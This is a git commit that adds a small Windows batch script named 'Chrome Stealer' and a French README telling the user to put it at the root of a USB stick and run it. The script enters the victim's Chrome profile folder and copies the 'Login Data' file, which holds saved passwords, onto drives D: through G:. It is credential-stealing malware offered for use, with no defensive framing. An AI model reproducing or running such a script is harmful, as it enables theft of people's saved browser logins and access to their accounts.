de9e09022102e942fed9b936bf68b67bf736634a
KeparYTbcc <67996155+KeparYTbcc@users.noreply.github.com>
2020-08-31 23:43:40 +0100

    Add files via upload

---
+++ Chrome Stealer Cmd version/README.md
@@ -0,0 +1,3 @@
+Mettre dans une cle usb
+et non dans un fichier dans la cle usb
+et le lancer
---
+++ Chrome Stealer Cmd version/stealer.bat
@@ -0,0 +1,9 @@
+
+color a
+cls
+cd "%localappdata%\Google\Chrome\User Data\Default"
+copy "login data" F:
+copy "login data" E:
+copy "login data" G:
+copy "login data" D:
+pause
